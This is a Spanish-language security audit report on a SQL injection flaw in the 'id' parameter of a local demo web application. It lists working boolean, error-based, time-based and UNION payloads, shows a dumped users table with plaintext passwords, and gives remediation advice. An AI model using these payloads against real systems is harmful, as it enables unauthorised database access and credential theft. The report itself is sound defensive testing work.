# Informe de Auditoría de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30  
**Hora:** 15:13 UTC  
**Herramientas:** curl, sqlmap 1.10.2

---

## Resumen Ejecutivo

Se identificó y explotó exitosamente una vulnerabilidad de **SQL Injection** en el parámetro `id` de la aplicación web. La explotación permitió extraer la totalidad de la base de datos `sqli_demo`, incluyendo credenciales de 8 usuarios en texto plano.

---

## Descripción de la Aplicación

La aplicación expone un formulario de búsqueda de usuarios mediante el parámetro GET `id`. La URL de búsqueda es:

```
http://web.dev.local:8083/?id=<valor>&Submit=Submit
```

**Stack tecnológico detectado:**
- Sistema operativo: Linux Debian
- Servidor web: Apache 2.4.65
- Lenguaje: PHP 8.1.33
- Base de datos: MySQL >= 5.1 (MariaDB fork)

---

## Vulnerabilidades Encontradas

### [CRÍTICA] SQL Injection en parámetro `id` (GET)

**Parámetro vulnerable:** `id`  
**Método:** GET  
**Tipo de inyección:** Múltiple (boolean-based blind, error-based, time-based blind, UNION query)

#### Tipos de inyección confirmados

| Tipo | Payload de ejemplo |
|------|--------------------|
| Boolean-based blind | `id=1' OR NOT 9498=9498#` |
| Error-based (EXTRACTVALUE) | `id=1' AND EXTRACTVALUE(4916,CONCAT(0x5c,...))-- XbML` |
| Time-based blind (SLEEP) | `id=1' AND (SELECT 9954 FROM (SELECT(SLEEP(5)))VhDO)-- ciFu` |
| UNION query (2 columnas) | `id=1' UNION ALL SELECT NULL,CONCAT(...)#` |

#### Prueba manual de confirmación

```bash
# Respuesta normal (ID válido)
GET /?id=1&Submit=Submit → Devuelve: John Doe

# ID inexistente - sin resultado
GET /?id=999&Submit=Submit → Sin resultado

# OR 1=1 - muestra datos (confirma inyección)
GET /?id=999+OR+1=1%23&Submit=Submit → Devuelve resultados

# AND condición falsa - confirma control booleano
GET /?id=1+AND+1=1%23&Submit=Submit → Devuelve resultado
```

---

## Explotación

### Datos extraídos

**Base de datos:** `sqli_demo`  
**Tabla:** `users`

| user_id | username   | first_name | last_name | email               | password    |
|---------|-----------|------------|-----------|---------------------|-------------|
| 1       | admin      | John       | Doe       | admin@example.com   | password123 |
| 2       | jsmith     | Jane       | Smith     | jane@example.com    | secret456   |
| 3       | bjohnson   | Bob        | Johnson   | bob@example.com     | mypass789   |
| 4       | awilliams  | Alice      | Williams  | alice@example.com   | qwerty123   |
| 5       | cbrown     | Charlie    | Brown     | charlie@example.com | password    |
| 6       | ddavis     | Diana      | Davis     | diana@example.com   | secure123   |
| 7       | emiller    | Eve        | Miller    | eve@example.com     | hackme      |
| 8       | fwilson    | Frank      | Wilson    | frank@example.com   | admin123    |

> ⚠️ **Las contraseñas están almacenadas en texto plano**, lo que constituye una vulnerabilidad adicional crítica.

---

## Impacto

- **Confidencialidad:** CRÍTICO — Exposición total de la base de datos con credenciales de todos los usuarios.
- **Integridad:** CRÍTICO — Un atacante podría modificar o eliminar datos de la base de datos.
- **Disponibilidad:** ALTO — Posibilidad de eliminar datos o colapsar la base de datos.
- **Escalada de privilegios:** CRÍTICO — Las credenciales del usuario `admin` podrían permitir acceso a otras partes del sistema.

---

## Causa Raíz

La aplicación construye la consulta SQL concatenando directamente el parámetro de entrada del usuario sin sanitización ni uso de consultas parametrizadas (prepared statements). Ejemplo de código vulnerable:

```php
// Código vulnerable (ejemplo)
$query = "SELECT * FROM users WHERE user_id = '" . $_GET['id'] . "'";
```

---

## Recomendaciones

1. **Usar consultas parametrizadas (Prepared Statements):**
   ```php
   $stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
   $stmt->execute([$_GET['id']]);
   ```

2. **Validar y sanitizar entradas:** Verificar que el parámetro `id` sea un entero antes de usarlo.

3. **Almacenar contraseñas con hash seguro:** Usar `bcrypt` o `Argon2` en lugar de texto plano.

4. **Principio de mínimo privilegio:** El usuario de base de datos de la aplicación no debe tener permisos de `SELECT` sobre tablas sensibles innecesarias ni permisos DDL.

5. **WAF / IDS:** Implementar un Web Application Firewall para detectar y bloquear patrones de inyección SQL.

6. **Mensajes de error:** No mostrar errores de base de datos al usuario final.

---

## Conclusión

La aplicación web en `http://web.dev.local:8083` presenta una vulnerabilidad crítica de SQL Injection que permite a cualquier atacante sin autenticación extraer, modificar o eliminar todos los datos de la base de datos. Se recomienda corrección inmediata mediante el uso de consultas parametrizadas y el cifrado de contraseñas almacenadas.
